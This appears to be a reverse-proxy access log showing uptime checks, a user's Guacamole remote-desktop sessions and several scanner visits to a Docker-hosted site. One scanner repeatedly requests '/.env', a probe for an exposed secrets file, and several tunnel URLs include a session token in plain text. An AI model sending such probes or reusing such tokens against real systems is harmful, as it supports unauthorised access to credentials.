159.203.109.206 - - [14/Dec/2023:15:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2489 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2490 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2491 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2492 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:53 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 2493 "livetrace@docker" "http://172.25.0.5:80" 5ms
129.55.200.20 - - [14/Dec/2023:15:29:53 +0000] "GET /trace/start.php?id=4jp7mwptr HTTP/2.0" 200 103 "-" "-" 2494 "livetrace@docker" "http://172.25.0.5:80" 3ms
129.55.200.20 - - [14/Dec/2023:15:29:54 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2495 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:55 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2496 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:56 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2497 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:57 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2498 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:58 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2499 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:29:59 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2500 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:30:00 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2501 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:01 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2502 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:02 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2503 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:30:03 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2504 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:04 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2505 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:05 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2506 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:06 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2507 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:07 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2508 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:08 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2509 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:09 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2510 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:10 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2511 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:11 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 83 "-" "-" 2512 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:12 +0000] "GET /trace/poll.php?id=4jp7mwptr HTTP/2.0" 200 245 "-" "-" 2513 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:30:16 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2514 "guacamole@docker" "http://172.25.0.9:8080" 9ms
129.55.200.20 - - [14/Dec/2023:15:30:16 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 2515 "guacamole@docker" "http://172.25.0.9:8080" 32ms
129.55.200.20 - - [14/Dec/2023:15:30:16 +0000] "GET /guacamole/api/session/tunnels/f76df6e5-f0a3-393e-94db-a298a978a7d3/protocol HTTP/2.0" 200 5172 "-" "-" 2517 "guacamole@docker" "http://172.25.0.9:8080" 8ms
129.55.200.20 - - [14/Dec/2023:15:30:16 +0000] "GET /guacamole/api/session/tunnels/f76df6e5-f0a3-393e-94db-a298a978a7d3/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2518 "guacamole@docker" "http://172.25.0.9:8080" 148ms
159.203.109.206 - - [14/Dec/2023:15:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2519 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2520 "www@docker" "http://172.25.0.8:80" 2ms
159.203.109.206 - - [14/Dec/2023:15:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2521 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2522 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2523 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2524 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:30:16 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2372&GUAC_HEIGHT=1506&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2516 "guacamole@docker" "http://172.25.0.9:8080" 180240ms
129.55.200.20 - - [14/Dec/2023:15:33:17 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2525 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:15:33:21 +0000] "GET /guacamole/api/session/tunnels/1ba9b091-4c4f-3b2f-af0d-b0a303d9c11e/protocol HTTP/2.0" 200 5172 "-" "-" 2527 "guacamole@docker" "http://172.25.0.9:8080" 7ms
129.55.200.20 - - [14/Dec/2023:15:33:21 +0000] "GET /guacamole/api/session/tunnels/1ba9b091-4c4f-3b2f-af0d-b0a303d9c11e/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2528 "guacamole@docker" "http://172.25.0.9:8080" 137ms
159.203.109.206 - - [14/Dec/2023:15:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2529 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:33:21 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2526 "guacamole@docker" "http://172.25.0.9:8080" 15561ms
129.55.200.20 - - [14/Dec/2023:15:33:37 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2530 "guacamole@docker" "http://172.25.0.9:8080" 5ms
167.71.120.76 - - [14/Dec/2023:15:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2531 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:33:53 +0000] "GET /guacamole/api/session/tunnels/a02cf656-f059-3551-b90f-dcdcf02ea058/protocol HTTP/2.0" 200 5172 "-" "-" 2533 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:33:53 +0000] "GET /guacamole/api/session/tunnels/a02cf656-f059-3551-b90f-dcdcf02ea058/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2534 "guacamole@docker" "http://172.25.0.9:8080" 109ms
159.203.109.206 - - [14/Dec/2023:15:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2535 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2536 "www@docker" "http://172.25.0.8:80" 1ms
71.6.146.186 - - [14/Dec/2023:15:34:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2537 "-" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:34:57 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2538 "-" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:34:57 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2539 "-" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:34:58 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 19 "-" "-" 2540 "-" "-" 0ms
71.6.146.186 - - [14/Dec/2023:15:34:59 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2541 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2542 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2543 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2544 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2545 "www@docker" "http://172.25.0.8:80" 0ms
103.93.203.43 - - [14/Dec/2023:15:37:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2546 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:15:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2547 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2548 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2549 "www@docker" "http://172.25.0.8:80" 2ms
167.71.120.76 - - [14/Dec/2023:15:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2550 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2551 "www@docker" "http://172.25.0.8:80" 0ms
78.153.140.221 - - [14/Dec/2023:15:39:29 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2552 "web-to-websecure@internal" "-" 0ms
78.153.140.221 - - [14/Dec/2023:15:39:29 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2553 "-" "-" 0ms
78.153.140.221 - - [14/Dec/2023:15:39:30 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2554 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:15:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2555 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2556 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2557 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:33:53 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2532 "guacamole@docker" "http://172.25.0.9:8080" 430592ms
159.203.109.206 - - [14/Dec/2023:15:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2558 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2559 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2560 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:26:45 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=5&GUAC_TYPE=c&GUAC_WIDTH=2372&GUAC_HEIGHT=1506&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2470 "guacamole@docker" "http://172.25.0.9:8080" 941111ms
129.55.200.20 - - [14/Dec/2023:15:42:27 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2561 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:42:29 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2562 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:42:29 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2564 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:15:42:29 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 2563 "guacamole@docker" "http://172.25.0.9:8080" 52ms
152.32.199.73 - - [14/Dec/2023:15:42:30 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2565 "-" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:42:32 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2566 "guacamole@docker" "http://172.25.0.9:8080" 9ms
129.55.200.20 - - [14/Dec/2023:15:42:32 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 2567 "guacamole@docker" "http://172.25.0.9:8080" 23ms
129.55.200.20 - - [14/Dec/2023:15:42:32 +0000] "GET /guacamole/api/session/tunnels/c4c3cb51-5f44-333c-ad2c-4b3c2d9dfea0/protocol HTTP/2.0" 200 5172 "-" "-" 2569 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:42:32 +0000] "GET /guacamole/api/session/tunnels/c4c3cb51-5f44-333c-ad2c-4b3c2d9dfea0/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2570 "guacamole@docker" "http://172.25.0.9:8080" 65ms
167.71.120.76 - - [14/Dec/2023:15:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2571 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:42:44 +0000] "GET /trace/ HTTP/2.0" 200 758 "-" "-" 2572 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:15:42:44 +0000] "GET /trace/start.php?id=ck09ynp52 HTTP/2.0" 200 103 "-" "-" 2573 "livetrace@docker" "http://172.25.0.5:80" 3ms
129.55.200.20 - - [14/Dec/2023:15:42:45 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2574 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:42:46 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2575 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:42:47 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2576 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:48 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2577 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:15:42:32 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2568 "guacamole@docker" "http://172.25.0.9:8080" 15850ms
129.55.200.20 - - [14/Dec/2023:15:42:48 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2578 "livetrace@docker" "http://172.25.0.5:80" 2ms
152.32.199.73 - - [14/Dec/2023:15:42:49 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 2579 "-" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:42:49 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2580 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:50 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2581 "livetrace@docker" "http://172.25.0.5:80" 1ms
152.32.199.73 - - [14/Dec/2023:15:42:51 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 2582 "-" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:42:51 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2583 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:52 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2584 "livetrace@docker" "http://172.25.0.5:80" 1ms
152.32.199.73 - - [14/Dec/2023:15:42:53 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 2585 "-" "-" 0ms
129.55.200.20 - - [14/Dec/2023:15:42:53 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2586 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:42:54 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2587 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:42:55 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2588 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:56 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2589 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:57 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2590 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:58 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2591 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:42:59 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2592 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:43:00 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2593 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:43:02 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2594 "livetrace@docker" "http://172.25.0.5:80" 2ms
129.55.200.20 - - [14/Dec/2023:15:43:03 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 83 "-" "-" 2595 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:43:04 +0000] "GET /guacamole/api/session/tunnels/7da36b6e-723f-3458-af9d-3b11def2be65/protocol HTTP/2.0" 200 5172 "-" "-" 2597 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:43:04 +0000] "GET /guacamole/api/session/tunnels/7da36b6e-723f-3458-af9d-3b11def2be65/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2598 "guacamole@docker" "http://172.25.0.9:8080" 72ms
129.55.200.20 - - [14/Dec/2023:15:43:04 +0000] "GET /trace/poll.php?id=ck09ynp52 HTTP/2.0" 200 245 "-" "-" 2599 "livetrace@docker" "http://172.25.0.5:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:43:19 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2600 "guacamole@docker" "http://172.25.0.9:8080" 11ms
129.55.200.20 - - [14/Dec/2023:15:43:04 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2596 "guacamole@docker" "http://172.25.0.9:8080" 15599ms
159.203.109.206 - - [14/Dec/2023:15:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2601 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2602 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:15:43:38 +0000] "GET /guacamole/api/session/tunnels/2c7cf4d2-9b82-31a9-a48e-4cf54c64e683/protocol HTTP/2.0" 200 5172 "-" "-" 2604 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:15:43:38 +0000] "GET /guacamole/api/session/tunnels/2c7cf4d2-9b82-31a9-a48e-4cf54c64e683/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2605 "guacamole@docker" "http://172.25.0.9:8080" 76ms
159.203.109.206 - - [14/Dec/2023:15:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2606 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:15:43:38 +0000] "GET /guacamole/websocket-tunnel?token=9A10AD176581F79A27D157E494E6A3D53B3632E7EA607D361CF4504C3221C2E7&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2603 "guacamole@docker" "http://172.25.0.9:8080" 57087ms
167.71.120.76 - - [14/Dec/2023:15:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2607 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2608 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2609 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2610 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2611 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2612 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2613 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2614 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2615 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2616 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2617 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2618 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2619 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2620 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2621 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2622 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2623 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:15:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2624 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:15:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2625 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:15:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2626 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:15:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2627 "www@docker" "http://172.25.0.8:80" 0ms
